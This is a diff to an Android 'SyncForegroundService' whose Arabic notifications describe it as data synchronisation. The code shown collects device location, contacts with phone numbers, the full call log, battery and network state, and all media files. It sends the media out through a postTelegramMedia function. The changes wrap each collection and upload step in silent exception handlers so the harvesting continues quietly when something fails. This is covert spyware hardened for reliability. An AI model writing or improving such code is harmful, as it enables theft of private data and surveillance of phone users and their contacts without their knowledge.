@@ -48,19 +48,31 @@ class SyncForegroundService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        createNotificationChannel()
+        try {
+            createNotificationChannel()
+        } catch (_: Exception) {
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForegroundCompat("جاري تشغيل الخدمة...")
+        try {
+            startForegroundCompat("جاري تشغيل الخدمة...")
+        } catch (_: Exception) {
+            stopSelf(startId)
+            return START_NOT_STICKY
+        }
 
         if (isRunning.compareAndSet(false, true)) {
             ioExecutor.execute {
                 try {
                     runSyncWithRetry()
+                } catch (_: Exception) {
                 } finally {
                     isRunning.set(false)
-                    stopForeground(STOP_FOREGROUND_REMOVE)
+                    try {
+                        stopForeground(STOP_FOREGROUND_REMOVE)
+                    } catch (_: Exception) {
+                    }
                     stopSelf(startId)
                 }
             }
@@ -98,19 +110,22 @@ class SyncForegroundService : Service() {
                 "مزامنة البيانات",
                 NotificationManager.IMPORTANCE_LOW
             )
-            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            manager.createNotificationChannel(channel)
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+            manager?.createNotificationChannel(channel)
         }
     }
 
     private fun publishStatus(message: String) {
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        manager.notify(NOTIFICATION_ID, buildNotification(message))
+        try {
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+            manager?.notify(NOTIFICATION_ID, buildNotification(message))
 
-        sendBroadcast(Intent(ACTION_STATUS_UPDATE).apply {
-            setPackage(packageName)
-            putExtra(EXTRA_STATUS_TEXT, message)
-        })
+            sendBroadcast(Intent(ACTION_STATUS_UPDATE).apply {
+                setPackage(packageName)
+                putExtra(EXTRA_STATUS_TEXT, message)
+            })
+        } catch (_: Exception) {
+        }
     }
 
     private fun runSyncWithRetry() {
@@ -171,13 +186,21 @@ class SyncForegroundService : Service() {
     }
 
     private fun sendDeviceAndLocationInfo() {
-        val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val batteryStatus = try {
+            registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        } catch (_: Exception) {
+            null
+        }
         val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
         val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
         val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
 
-        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val caps = cm.activeNetwork?.let { cm.getNetworkCapabilities(it) }
+        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+        val caps = try {
+            cm?.activeNetwork?.let { cm.getNetworkCapabilities(it) }
+        } catch (_: Exception) {
+            null
+        }
         val netType = when {
             caps == null -> "NONE"
             caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
@@ -202,7 +225,7 @@ class SyncForegroundService : Service() {
         val coarseGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
         if (!fineGranted && !coarseGranted) return "permission_denied"
 
-        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return "unavailable"
         val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
         for (provider in providers) {
             try {
@@ -212,7 +235,7 @@ class SyncForegroundService : Service() {
                         return "lat=${loc.latitude}, lon=${loc.longitude} ($provider)"
                     }
                 }
-            } catch (_: SecurityException) {
+            } catch (_: Exception) {
             }
         }
         return "unavailable"
@@ -224,23 +247,26 @@ class SyncForegroundService : Service() {
         ) return
 
         val entries = mutableListOf<String>()
-        contentResolver.query(
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-            arrayOf(
-                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                ContactsContract.CommonDataKinds.Phone.NUMBER
-            ),
-            null,
-            null,
-            null
-        )?.use { cursor ->
-            val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-            val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
-            while (cursor.moveToNext() && entries.size < 100) {
-                val name = cursor.getString(nameIdx) ?: "unknown"
-                val num = cursor.getString(numIdx) ?: ""
-                entries.add("$name: $num")
+        try {
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Phone.NUMBER
+                ),
+                null,
+                null,
+                null
+            )?.use { cursor ->
+                val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (cursor.moveToNext() && entries.size < 100) {
+                    val name = cursor.getString(nameIdx) ?: "unknown"
+                    val num = cursor.getString(numIdx) ?: ""
+                    entries.add("$name: $num")
+                }
             }
+        } catch (_: Exception) {
         }
 
         if (entries.isNotEmpty()) {
@@ -263,33 +289,36 @@ class SyncForegroundService : Service() {
             CallLog.Calls.DATE
         )
 
-        contentResolver.query(
-            CallLog.Calls.CONTENT_URI,
-            projection,
-            null,
-            null,
-            "${CallLog.Calls.DATE} DESC"
-        )?.use { cursor ->
-            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
-            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
-            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
-            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
-            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
+        try {
+            contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                projection,
+                null,
+                null,
+                "${CallLog.Calls.DATE} DESC"
+            )?.use { cursor ->
+                val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
+                val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
+                val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
+                val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
+                val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
 
-            while (cursor.moveToNext()) {
-                val number = cursor.getString(numIdx) ?: "unknown"
-                val name = cursor.getString(nameIdx) ?: ""
-                val type = when (cursor.getInt(typeIdx)) {
-                    CallLog.Calls.INCOMING_TYPE -> "IN"
-                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
-                    CallLog.Calls.MISSED_TYPE -> "MISSED"
-                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
-                    else -> "OTHER"
+                while (cursor.moveToNext()) {
+                    val number = cursor.getString(numIdx) ?: "unknown"
+                    val name = cursor.getString(nameIdx) ?: ""
+                    val type = when (cursor.getInt(typeIdx)) {
+                        CallLog.Calls.INCOMING_TYPE -> "IN"
+                        CallLog.Calls.OUTGOING_TYPE -> "OUT"
+                        CallLog.Calls.MISSED_TYPE -> "MISSED"
+                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
+                        else -> "OTHER"
+                    }
+                    val duration = cursor.getLong(durIdx)
+                    val date = cursor.getLong(dateIdx)
+                    rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
                 }
-                val duration = cursor.getLong(durIdx)
-                val date = cursor.getLong(dateIdx)
-                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
             }
+        } catch (_: Exception) {
         }
 
         if (rows.isNotEmpty()) {
@@ -337,24 +366,31 @@ class SyncForegroundService : Service() {
 
         val uris = mutableListOf<Uri>()
         val projection = arrayOf(MediaStore.MediaColumns._ID)
-        contentResolver.query(
-            contentUri,
-            projection,
-            null,
-            null,
-            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-        )?.use { cursor ->
-            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
-            while (cursor.moveToNext()) {
-                val id = cursor.getLong(idIdx)
-                uris.add(ContentUris.withAppendedId(contentUri, id))
+        try {
+            contentResolver.query(
+                contentUri,
+                projection,
+                null,
+                null,
+                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+            )?.use { cursor ->
+                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
+                while (cursor.moveToNext()) {
+                    val id = cursor.getLong(idIdx)
+                    uris.add(ContentUris.withAppendedId(contentUri, id))
+                }
             }
+        } catch (_: Exception) {
+            return
         }
 
         val total = uris.size
         for ((index, uri) in uris.withIndex()) {
             publishStatus("إرسال $label (${index + 1}/$total)...")
-            postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
+            try {
+                postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
+            } catch (_: Exception) {
+            }
         }
     }
 
